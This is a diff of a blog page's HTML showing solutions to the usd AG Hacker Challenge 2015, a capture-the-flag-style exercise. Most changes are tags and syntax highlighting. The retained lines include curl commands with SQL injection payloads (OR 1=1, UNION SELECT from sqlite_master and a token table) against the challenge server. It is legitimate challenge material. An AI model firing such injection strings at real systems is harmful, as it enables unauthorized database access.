@@ -1596,7 +1596,7 @@ init_mathjax();
 <link rel="canonical" href="http://blog.dornea.nu/2015/03/18/usd-ag-hacker-challenge-2015-solutions">
 
         <meta name="author" content="Victor Dorneanu" />
-        <meta name="keywords" content="android,hacking,network,security,ipython" />
+        <meta name="keywords" content="android,hacking,networking,security,ipython,ctf,usd,wargames" />
         <meta name="description" content="usd AG has announced a hacking challenge I have participated at. The target system was available at http://82.195.79.41/. Now let me sum up thg steps that have been required in order to get all 6 tokens. In [122]: Expand Code import pandas as pd import sqlite3 ..." />
 
         <meta property="og:site_name" content="blog.dornea.nu" />
@@ -1608,9 +1608,12 @@ init_mathjax();
             <meta property="article:section" content="blog" />
             <meta property="article:tag" content="android" />
             <meta property="article:tag" content="hacking" />
-            <meta property="article:tag" content="network" />
+            <meta property="article:tag" content="networking" />
             <meta property="article:tag" content="security" />
             <meta property="article:tag" content="ipython" />
+            <meta property="article:tag" content="ctf" />
+            <meta property="article:tag" content="usd" />
+            <meta property="article:tag" content="wargames" />
             <meta property="article:author" content="Victor Dorneanu" />
 
     <meta name="twitter:card" content="summary">
@@ -1713,11 +1716,17 @@ blog.dornea.nu            </a>
         /
 	<a href="http://blog.dornea.nu/tag/hacking/">hacking</a>
         /
-	<a href="http://blog.dornea.nu/tag/network/">network</a>
+	<a href="http://blog.dornea.nu/tag/networking/">networking</a>
         /
 	<a href="http://blog.dornea.nu/tag/security/">security</a>
         /
 	<a href="http://blog.dornea.nu/tag/ipython/">ipython</a>
+        /
+	<a href="http://blog.dornea.nu/tag/ctf/">ctf</a>
+        /
+	<a href="http://blog.dornea.nu/tag/usd/">usd</a>
+        /
+	<a href="http://blog.dornea.nu/tag/wargames/">wargames</a>
     
 </footer><!-- /.post-info -->                    </div>
                 </div>
@@ -2251,7 +2260,7 @@ In&nbsp;[13]:
 </div>
 
 <div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>strings usd_Hackertag_2015.pdf | tail -n 20
+<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>strings usd_Hackertag_2015.pdf <span class="p">|</span> tail -n <span class="m">20</span>
 </pre></div>
 
 </div>
@@ -2469,7 +2478,7 @@ In&nbsp;[75]:
 </div>
 
 <div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=1&#39;&quot;</span> 2&gt; /dev/null | tail -n 1
+<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=1&#39;&quot;</span> 2&gt; /dev/null <span class="p">|</span> tail -n <span class="m">1</span>
 </pre></div>
 
 </div>
@@ -2506,7 +2515,7 @@ In&nbsp;[82]:
 </div>
 
 <div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=1&#39;%20OR 1=1&quot;</span> 2&gt; /dev/null | tail -n 1
+<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=1&#39;%20OR 1=1&quot;</span> 2&gt; /dev/null <span class="p">|</span> tail -n <span class="m">1</span>
 </pre></div>
 
 </div>
@@ -2543,7 +2552,7 @@ In&nbsp;[89]:
 </div>
 
 <div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,&#39;k&#39;;--#&quot;</span> 2&gt; /dev/null | tail -n 20
+<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,&#39;k&#39;;--#&quot;</span> 2&gt; /dev/null <span class="p">|</span> tail -n <span class="m">20</span>
 </pre></div>
 
 </div>
@@ -2602,7 +2611,7 @@ In&nbsp;[91]:
 </div>
 
 <div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20CONCAT(&#39;a&#39;, &#39;b&#39;),&#39;k&#39;;--#&quot;</span> 2&gt; /dev/null | grep <span class="s2">&quot;contentliquid&quot;</span>
+<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20CONCAT(&#39;a&#39;, &#39;b&#39;),&#39;k&#39;;--#&quot;</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">&quot;contentliquid&quot;</span>
 </pre></div>
 
 </div>
@@ -2631,7 +2640,7 @@ In&nbsp;[93]:
 </div>
 
 <div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;+&#39;b&#39;,&#39;k&#39;;--#&quot;</span> 2&gt; /dev/null | grep <span class="s2">&quot;contentliquid&quot;</span>
+<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;+&#39;b&#39;,&#39;k&#39;;--#&quot;</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">&quot;contentliquid&quot;</span>
 </pre></div>
 
 </div>
@@ -2660,7 +2669,7 @@ In&nbsp;[94]:
 </div>
 
 <div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;||&#39;b&#39;,&#39;k&#39;;--#&quot;</span> 2&gt; /dev/null | grep <span class="s2">&quot;contentliquid&quot;</span>
+<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;||&#39;b&#39;,&#39;k&#39;;--#&quot;</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">&quot;contentliquid&quot;</span>
 </pre></div>
 
 </div>
@@ -2698,7 +2707,7 @@ In&nbsp;[99]:
 </div>
 
 <div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,name%20FROM%20sqlite_master;--#&quot;</span> 2&gt; /dev/null | grep <span class="s2">&quot;contentliquid&quot;</span>
+<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,name%20FROM%20sqlite_master;--#&quot;</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">&quot;contentliquid&quot;</span>
 </pre></div>
 
 </div>
@@ -2741,7 +2750,7 @@ In&nbsp;[101]:
 </div>
 
 <div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,sql%20FROM%20sqlite_master%20WHERE%20name=&#39;token&#39;;--#&quot;</span> 2&gt; /dev/null | grep <span class="s2">&quot;contentliquid&quot;</span>
+<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,sql%20FROM%20sqlite_master%20WHERE%20name=&#39;token&#39;;--#&quot;</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">&quot;contentliquid&quot;</span>
 </pre></div>
 
 </div>
@@ -2779,7 +2788,7 @@ In&nbsp;[102]:
 </div>
 
 <div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,token_val%20FROM%20token;--#&quot;</span> 2&gt; /dev/null | grep <span class="s2">&quot;contentliquid&quot;</span>
+<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">&quot;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,token_val%20FROM%20token;--#&quot;</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">&quot;contentliquid&quot;</span>
 </pre></div>
 
 </div>
@@ -2858,7 +2867,7 @@ In&nbsp;[105]:
 </div>
 
 <div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>nc 82.195.79.41 4141
+<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>nc 82.195.79.41 <span class="m">4141</span>
 </pre></div>
 
 </div>
@@ -3098,7 +3107,7 @@ In&nbsp;[108]:
 </div>
 
 <div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span><span class="nb">echo</span> -n <span class="s2">&quot;Hackertagblue&quot;</span> | md5sum
+<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span><span class="nb">echo</span> -n <span class="s2">&quot;Hackertagblue&quot;</span> <span class="p">|</span> md5sum
 </pre></div>
 
 </div>
@@ -3186,7 +3195,7 @@ In&nbsp;[119]:
 </div>
 
 <div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span><span class="nb">echo</span> <span class="s2">&quot;VG9rZW46IDU1MTI0Mw==&quot;</span> | base64 -d
+<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span><span class="nb">echo</span> <span class="s2">&quot;VG9rZW46IDU1MTI0Mw==&quot;</span> <span class="p">|</span> base64 -d
 </pre></div>
 
 </div>
@@ -3221,11 +3230,11 @@ In&nbsp;[119]:
 <section class="well" id="related-posts">
     <h4>Related Posts:</h4>
     <ul>
-        <li><a href="http://blog.dornea.nu/2014/08/05/android-dynamic-code-analysis-mastering-droidbox">Android Dynamic Code Analysis - Mastering DroidBox</a></li>
-        <li><a href="http://blog.dornea.nu/2014/01/23/24h-android-sniffing-using-tcpdump-ipython-notebook-version">24h Android sniffing using tcpdump - IPython Notebook Version</a></li>
-        <li><a href="http://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis">Disect Android APKs like a Pro - Static code analysis</a></li>
         <li><a href="http://blog.dornea.nu/2015/06/03/usd-ag-hacker-day-in-hamburg">usd AG Hacker Day in Hamburg</a></li>
-        <li><a href="http://blog.dornea.nu/2015/07/01/debugging-android-native-shared-libraries">Debugging Android native shared libraries</a></li>
+        <li><a href="http://blog.dornea.nu/2014/01/23/24h-android-sniffing-using-tcpdump">24h Android sniffing using tcpdump</a></li>
+        <li><a href="http://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis">Disect Android APKs like a Pro - Static code analysis</a></li>
+        <li><a href="http://blog.dornea.nu/2014/01/23/24h-android-sniffing-using-tcpdump-ipython-notebook-version">24h Android sniffing using tcpdump - IPython Notebook Version</a></li>
+        <li><a href="http://blog.dornea.nu/2014/08/05/android-dynamic-code-analysis-mastering-droidbox">Android Dynamic Code Analysis - Mastering DroidBox</a></li>
     </ul>
 </section>
     <hr />
@@ -3286,6 +3295,11 @@ In&nbsp;[119]:
             <li class="list-group-item"><h4><i class="fa fa-home fa-lg"></i><span class="icon-label">Recent Posts</span></h4>
                 <ul class="list-group" id="recentposts">
                     <li class="list-group-item">
+                        <a href="http://blog.dornea.nu/2015/10/21/basic-layer-2-switching-using-cisco-packet-tracer">
+                            Basic Layer 2 Switching using Cisco Packet Tracer
+                        </a>
+                    </li>
+                    <li class="list-group-item">
                         <a href="http://blog.dornea.nu/2015/10/02/manage-pki-using-openssl">
                             Manage PKI using OpenSSL
                         </a>
@@ -3315,11 +3329,6 @@ In&nbsp;[119]:
                             Validating and pinning X.509 certificates
                         </a>
                     </li>
-                    <li class="list-group-item">
-                        <a href="http://blog.dornea.nu/2015/05/06/adding-concurrency-to-smalisca">
-                            Adding concurrency to smalisca
-                        </a>
-                    </li>
                 </ul>
             </li>
 
@@ -3340,316 +3349,6 @@ In&nbsp;[119]:
 
             <li class="list-group-item"><a href="http://blog.dornea.nu/"><h4><i class="fa fa-tags fa-lg"></i><span class="icon-label">Tags</span></h4></a>
                 <ul class="list-group list-inline tagcloud" id="tags">
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/adobe/">
-                            adobe
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/androguard/">
-                            androguard
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-1">
-                        <a href="http://blog.dornea.nu/tag/android/">
-                            android
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/apple/">
-                            apple
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-2">
-                        <a href="http://blog.dornea.nu/tag/appsec/">
-                            appsec
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/blockdiag/">
-                            blockdiag
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/blog/">
-                            blog
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/books/">
-                            books
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/burp/">
-                            burp
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/c/">
-                            c
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/code/">
-                            code
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-1">
-                        <a href="http://blog.dornea.nu/tag/coding/">
-                            coding
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-2">
-                        <a href="http://blog.dornea.nu/tag/crypto/">
-                            crypto
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/cryptography/">
-                            cryptography
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/debug/">
-                            debug
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/docker/">
-                            docker
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/droidbox/">
-                            droidbox
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/eclipse/">
-                            eclipse
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/events/">
-                            events
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/fakebanker/">
-                            fakebanker
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/flash/">
-                            flash
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/graphviz/">
-                            graphviz
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-1">
-                        <a href="http://blog.dornea.nu/tag/hacking/">
-                            hacking
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-1">
-                        <a href="http://blog.dornea.nu/tag/howto/">
-                            howto
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/infosec/">
-                            infosec
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/ios/">
-                            ios
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/iptables/">
-                            iptables
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-1">
-                        <a href="http://blog.dornea.nu/tag/ipython/">
-                            ipython
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/java/">
-                            java
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/javascript/">
-                            javascript
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/jquery/">
-                            jquery
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/linux/">
-                            linux
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-1">
-                        <a href="http://blog.dornea.nu/tag/low/">
-                            low
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-1">
-                        <a href="http://blog.dornea.nu/tag/misc/">
-                            misc
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-1">
-                        <a href="http://blog.dornea.nu/tag/mobile/">
-                            mobile
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-1">
-                        <a href="http://blog.dornea.nu/tag/network/">
-                            network
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/networking/">
-                            networking
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-2">
-                        <a href="http://blog.dornea.nu/tag/note/">
-                            note
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/octopress/">
-                            octopress
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/openssl/">
-                            openssl
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/pandoc/">
-                            pandoc
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/pelican/">
-                            pelican
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/pocket/">
-                            pocket
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/programming/">
-                            programming
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-1">
-                        <a href="http://blog.dornea.nu/tag/python/">
-                            python
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/re/">
-                            re
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/sca/">
-                            sca
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/science/">
-                            science
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-1">
-                        <a href="http://blog.dornea.nu/tag/security/">
-                            security
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/smalisca/">
-                            smalisca
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/ssl/">
-                            ssl
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/tiddly/">
-                            tiddly
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/tls/">
-                            tls
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-2">
-                        <a href="http://blog.dornea.nu/tag/uncategorized/">
-                            uncategorized
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-2">
-                        <a href="http://blog.dornea.nu/tag/virtualization/">
-                            virtualization
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-3">
-                        <a href="http://blog.dornea.nu/tag/viz/">
-                            viz
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-2">
-                        <a href="http://blog.dornea.nu/tag/wargames/">
-                            wargames
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-1">
-                        <a href="http://blog.dornea.nu/tag/web/">
-                            web
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/whatsapp/">
-                            whatsapp
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-1">
-                        <a href="http://blog.dornea.nu/tag/wtf/">
-                            wtf
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/x509/">
-                            x509
-                        </a>
-                    </li>
-                    <li class="list-group-item tag-4">
-                        <a href="http://blog.dornea.nu/tag/xmind/">
-                            xmind
-                        </a>
-                    </li>
                 </ul>
             </li>
 
